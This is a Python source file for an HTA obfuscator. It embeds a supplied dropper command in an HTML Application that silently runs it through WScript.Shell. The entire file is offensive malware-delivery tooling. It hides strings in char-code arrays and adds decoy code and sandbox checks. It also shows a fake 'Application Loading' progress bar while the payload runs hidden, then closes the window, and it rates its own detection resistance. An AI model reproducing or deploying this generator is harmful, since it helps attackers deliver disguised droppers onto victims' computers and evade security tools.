#!/usr/bin/env python3
"""
Advanced HTA Obfuscator Module - DEFINITIVELY FIXED
CRITICAL FIX: Variable naming collision completely resolved
"""

import random
import string
import hashlib
import time

class AdvancedHTAObfuscator:
    def __init__(self, obfuscation_level=1):
        self.obfuscation_level = max(1, min(10, obfuscation_level))
        self.var_counter = random.randint(1000, 9999)
        if self.obfuscation_level >= 8:
            self.session_id = self._generate_session_id()
            self.base_template = self._get_stealth_template()
        else:
            self.base_template = self._get_base_template()
    
    def _generate_session_id(self):
        timestamp = str(int(time.time()))
        random_part = ''.join(random.choice(string.ascii_letters) for _ in range(8))
        return hashlib.md5(f"{timestamp}{random_part}".encode()).hexdigest()[:12]
    
    def _get_base_template(self):
        return '''<html>
<head>
<script language="JScript">
{obfuscated_vars}
{string_reconstructions}
{decoy_code}
{main_execution}
</script>
</head>
<body>
{body_content}
<script language="JScript">
{close_obfuscation}
</script>
</body>
</html>'''
    
    def _get_stealth_template(self):
        return '''<html>
<head>
<title>Loading</title>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<style>
body {{ font-family: Arial; margin: 20px; }}
.loading {{ text-align: center; padding: 50px; }}
.progress {{ width: 100%; background: #f0f0f0; height: 25px; }}
.bar {{ height: 20px; background: #4CAF50; width: 0%; }}
</style>
<script language="JScript">
{environmental_checks}
{obfuscated_vars}
{string_reconstructions}
{decoy_code}
{stealth_execution}
</script>
</head>
<body>
<div class="loading">
    <h3>Application Loading</h3>
    <div class="progress">
        <div class="bar" id="progressBar"></div>
    </div>
    <p id="statusText">Initializing</p>
</div>
{body_content}
<script language="JScript">
{interaction_handler}
{close_obfuscation}
</script>
</body>
</html>'''
    
    def _generate_guaranteed_unique_var(self, prefix="var"):
        self.var_counter += 1
        if self.obfuscation_level <= 3:
            base = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
        else:
            base = ''.join(random.choice(string.ascii_letters) for _ in range(8))
        return f"{base}_{self.var_counter}"
    
    def _string_to_charcode_array(self, text):
        char_codes = [ord(c) for c in text]
        if self.obfuscation_level >= 5:
            obfuscated_codes = []
            for code in char_codes:
                if random.choice([True, False]) and code >= 20 and code < 200:
                    operations = [
                        lambda x: f"({x-5}+5)",
                        lambda x: f"({x+3}-3)",
                        lambda x: str(x)
                    ]
                    operation = random.choice(operations)
                    obfuscated_codes.append(operation(code))
                else:
                    obfuscated_codes.append(str(code))
            return obfuscated_codes
        return [str(code) for code in char_codes]
    
    def _create_charcode_reconstruction(self, text, array_var_name):
        char_codes = self._string_to_charcode_array(text)
        if self.obfuscation_level >= 8 and len(char_codes) > 5:
            chunk_size = max(2, len(char_codes) // 3)
            chunks = [char_codes[i:i + chunk_size] for i in range(0, len(char_codes), chunk_size)]
            code_lines = []
            chunk_vars = []
            for i, chunk in enumerate(chunks):
                chunk_var = self._generate_guaranteed_unique_var()
                chunk_vars.append(chunk_var)
                code_lines.append(f"var {chunk_var}=[{','.join(map(str, chunk))}];")
            combined_array = f"[].concat({').concat('.join(chunk_vars)})"
            code_lines.append(f"var {array_var_name}={combined_array};")
            return '\n'.join(code_lines)
        else:
            return f"var {array_var_name}=[{','.join(map(str, char_codes))}];"
    
    def _create_string_reconstruction(self, array_var, string_var):
        if self.obfuscation_level <= 4:
            return f"var {string_var}='';for(var i=0;i<{array_var}.length;i++){{{string_var}+=String.fromCharCode({array_var}[i])}}"
        elif self.obfuscation_level == 5:
            dummy_var = self._generate_guaranteed_unique_var()
            return f"var {dummy_var}=0;var {string_var}='';for(var i=0;i<{array_var}.length;i++){{{dummy_var}++;{string_var}+=String.fromCharCode({array_var}[i])}}"
        else:
            loop_styles = [
                f"var {string_var}='';for(var i=0;i<{array_var}.length;i++){{{string_var}+=String.fromCharCode({array_var}[i])}}",
                f"var {string_var}='';var i=0;while(i<{array_var}.length){{{string_var}+=String.fromCharCode({array_var}[i]);i++}}"
            ]
            return random.choice(loop_styles)
    
    def _generate_decoy_code(self):
        if self.obfuscation_level < 3:
            return ""
        decoy_lines = []
        num_decoys = min(self.obfuscation_level, 5)
        for _ in range(num_decoys):
            var_name = self._generate_guaranteed_unique_var()
            decoy_type = random.choice(['math', 'string'])
            if decoy_type == 'math':
                operation = random.choice([
                    f"var {var_name}=Math.floor(Math.random()*100);",
                    f"var {var_name}=parseInt('123',10)+7;",
                    f"var {var_name}=42*2-84;"
                ])
                decoy_lines.append(operation)
            else:
                dummy_strings = ['temp', 'data', 'info', 'config']
                decoy_lines.append(f"var {var_name}='{random.choice(dummy_strings)}';")
        return '\n'.join(decoy_lines)
    
    def _obfuscate_sensitive_strings(self):
        sensitive_strings = {
            'wscript_shell': 'WScript.Shell',
            'self_ref': 'self',
            'close_method': 'close'
        }
        if self.obfuscation_level >= 9:
            sensitive_strings.update({
                'run_method': 'Run',
                'activex': 'ActiveXObject',
                'script_lang': 'JScript'
            })
        obfuscated_vars = []
        string_reconstructions = []
        var_mappings = {}
        for key, string_value in sensitive_strings.items():
            array_var = self._generate_guaranteed_unique_var("arr")
            string_var = self._generate_guaranteed_unique_var("str")
            obfuscated_vars.append(self._create_charcode_reconstruction(string_value, array_var))
            string_reconstructions.append(self._create_string_reconstruction(array_var, string_var))
            var_mappings[key] = string_var
        return obfuscated_vars, string_reconstructions, var_mappings
    
    def _generate_environmental_checks(self):
        if self.obfuscation_level < 8:
            return ""
        check_var = self._generate_guaranteed_unique_var()
        return f'''
var {check_var} = true;
try {{
    {check_var} = (screen.width > 800 && screen.height > 600);
    if (typeof ActiveXObject === 'undefined') {check_var} = false;
}} catch(e) {{
    {check_var} = false;
}}
'''
    
    def _generate_interaction_handler(self):
        if self.obfuscation_level < 8:
            return ""
        progress_var = self._generate_guaranteed_unique_var()
        return f'''
var {progress_var} = 0;
try {{
    var progressInterval = setInterval(function() {{
        {progress_var} += Math.random() * 15;
        if ({progress_var} > 100) {progress_var} = 100;
        try {{
            var bar = document.getElementById('progressBar');
            var status = document.getElementById('statusText');
            if (bar) bar.style.width = {progress_var} + '%';
            if (status) {{
                if ({progress_var} < 30) status.innerText = 'Loading components';
                else if ({progress_var} < 60) status.innerText = 'Initializing framework';
                else if ({progress_var} < 90) status.innerText = 'Finalizing setup';
                else status.innerText = 'Ready';
            }}
        }} catch(e) {{}}
        if ({progress_var} >= 100) {{
            clearInterval(progressInterval);
            setTimeout(function() {{
                try {{ document.body.style.display = 'none'; }} catch(e) {{}}
            }}, 1000);
        }}
    }}, 200);
}} catch(e) {{}}
'''
    
    def _create_advanced_execution(self, var_mappings, shell_var, cmd_var, result_var):
        if self.obfuscation_level <= 7:
            activex_creation = f"var {shell_var}=new ActiveXObject({var_mappings['wscript_shell']});"
            execution = f"var {result_var}={shell_var}.Run({cmd_var},0,false);"
            return f"{activex_creation}\n{execution}"
        else:
            constructor_var = self._generate_guaranteed_unique_var()
            check_var = self._generate_guaranteed_unique_var()
            anti_analysis = f"var {check_var}=typeof(ActiveXObject)!=='undefined';"
            activex_creation = f"var {constructor_var}=ActiveXObject;var {shell_var}=new {constructor_var}({var_mappings['wscript_shell']});"
            execution = f"if({check_var}){{var {result_var}={shell_var}.Run({cmd_var},0,false);}}"
            return f"{anti_analysis}\n{activex_creation}\n{execution}"

    def _create_stealth_execution(self, var_mappings, cmd_var):
        shell_var = self._generate_guaranteed_unique_var()
        result_var = self._generate_guaranteed_unique_var()
        return f'''
setTimeout(function() {{
    try {{
        var {shell_var} = new ActiveXObject({var_mappings['wscript_shell']});
        var {result_var} = {shell_var}.Run({cmd_var}, 0, false);
        setTimeout(function() {{
            try {{
                window[{var_mappings['self_ref']}][{var_mappings['close_method']}]();
            }} catch(e) {{}}
        }}, 1500);
    }} catch(e) {{
    }}
}}, 1000);
'''
    
    def _create_body_content(self):
        if self.obfuscation_level < 7:
            return ""
        fake_contents = [
            '<div style="display:none">Loading</div>',
            '<noscript>Please enable JavaScript</noscript>',
            '<!-- Application Loading -->'
        ]
        selected_content = random.sample(fake_contents, min(2, len(fake_contents)))
        return '\n'.join(selected_content)
    
    def _create_close_obfuscation(self, var_mappings):
        if self.obfuscation_level <= 3:
            return f"window[{var_mappings['self_ref']}][{var_mappings['close_method']}]();"
        elif self.obfuscation_level <= 6:
            delay = random.randint(100, 1000)
            return f"setTimeout(function(){{window[{var_mappings['self_ref']}][{var_mappings['close_method']}]();}},{delay});"
        else:
            delay = random.randint(500, 2000)
            check_var = self._generate_guaranteed_unique_var()
            return f'''
try {{
    var {check_var}=window[{var_mappings['self_ref']}];
    if({check_var}){{
        setTimeout(function(){{
            try {{ {check_var}[{var_mappings['close_method']}](); }} catch(e) {{}}
        }},{delay});
    }}
}} catch(e) {{}}
'''
    
    def _build_js_command(self, command):
        """Escapes the full powershell command for embedding as a JS double-quoted string."""
        js_escaped = (command
                      .replace('\\', '\\\\')
                      .replace('"', '\\"')
                      .replace('\r', '\\r')
                      .replace('\n', '\\n'))
        return js_escaped

    def generate_obfuscated_hta(self, dropper_code):
        try:
            self.var_counter = random.randint(1000, 9999)
            js_command = self._build_js_command(dropper_code)
            obfuscated_vars, string_reconstructions, var_mappings = self._obfuscate_sensitive_strings()
            shell_var = self._generate_guaranteed_unique_var("shell")
            cmd_var = self._generate_guaranteed_unique_var("cmd")
            result_var = self._generate_guaranteed_unique_var("result")
            cmd_setup = f'var {cmd_var}="{js_command}";'
            decoy_code = self._generate_decoy_code()
            body_content = self._create_body_content()
            close_obfuscation = self._create_close_obfuscation(var_mappings)
            all_obfuscated_vars = '\n'.join(obfuscated_vars)
            all_string_reconstructions = '\n'.join(string_reconstructions)
            if self.obfuscation_level >= 8:
                environmental_checks = self._generate_environmental_checks()
                stealth_execution = self._create_stealth_execution(var_mappings, cmd_var)
                interaction_handler = self._generate_interaction_handler()
                final_execution = f"{cmd_setup}\n{stealth_execution}"
                hta_content = self.base_template.format(
                    environmental_checks=environmental_checks,
                    obfuscated_vars=all_obfuscated_vars,
                    string_reconstructions=all_string_reconstructions,
                    decoy_code=decoy_code,
                    stealth_execution=final_execution,
                    body_content=body_content,
                    interaction_handler=interaction_handler,
                    close_obfuscation=close_obfuscation
                )
            else:
                main_execution = self._create_advanced_execution(var_mappings, shell_var, cmd_var, result_var)
                final_execution = f"{cmd_setup}\n{main_execution}"
                hta_content = self.base_template.format(
                    obfuscated_vars=all_obfuscated_vars,
                    string_reconstructions=all_string_reconstructions,
                    decoy_code=decoy_code,
                    main_execution=final_execution,
                    body_content=body_content,
                    close_obfuscation=close_obfuscation
                )
            return hta_content
        except Exception as e:
            print(f"\033[91m[ERROR]\033[0m ADVANCED HTA OBFUSCATOR - Error generating HTA: {e}")
            return None
    
    def get_obfuscation_info(self):
        level_descriptions = {
            1: "Basic: Simple variable obfuscation",
            2: "Basic+: Char code arrays", 
            3: "Intermediate: Multiple loop styles, basic decoys",
            4: "Intermediate+: Mixed naming, more decoys",
            5: "Advanced: Mathematical operations, dummy vars",
            6: "Advanced+: Method indirection, fake body content",
            7: "Expert: Complex reconstruction, timing delays",
            8: "Expert+: Environmental checks, stealth UI, progress simulation",
            9: "Maximum: Anti-analysis, full indirection, behavioral validation",
            10: "Stealth: All techniques + maximum complexity + polymorphism"
        }
        techniques = []
        if self.obfuscation_level >= 1:
            techniques.append("Variable name randomization")
        if self.obfuscation_level >= 2:
            techniques.append("Character code arrays")
        if self.obfuscation_level >= 3:
            techniques.append("Decoy code generation")
        if self.obfuscation_level >= 4:
            techniques.append("Multiple loop styles")
        if self.obfuscation_level >= 5:
            techniques.append("Mathematical expressions")
        if self.obfuscation_level >= 6:
            techniques.append("Method indirection")
        if self.obfuscation_level >= 7:
            techniques.append("Execution timing")
        if self.obfuscation_level >= 8:
            techniques.append("Environmental validation")
            techniques.append("Stealth UI interface")
        if self.obfuscation_level >= 9:
            techniques.append("Anti-analysis checks")
        if self.obfuscation_level >= 10:
            techniques.append("Maximum stealth mode")
            if hasattr(self, 'session_id'):
                techniques.append("Polymorphic generation")
        return {
            "level": self.obfuscation_level,
            "description": level_descriptions.get(self.obfuscation_level, "Unknown"),
            "techniques": techniques,
            "detection_resistance": "Low" if self.obfuscation_level <= 3 else 
                                   "Medium" if self.obfuscation_level <= 6 else
                                   "High" if self.obfuscation_level <= 8 else "Maximum",
            "stealth_features": self.obfuscation_level >= 8,
            "polymorphic": hasattr(self, 'session_id'),
            "guaranteed_unique_vars": True,
            "critical_fix_applied": "variable_collision_resolved"
        }
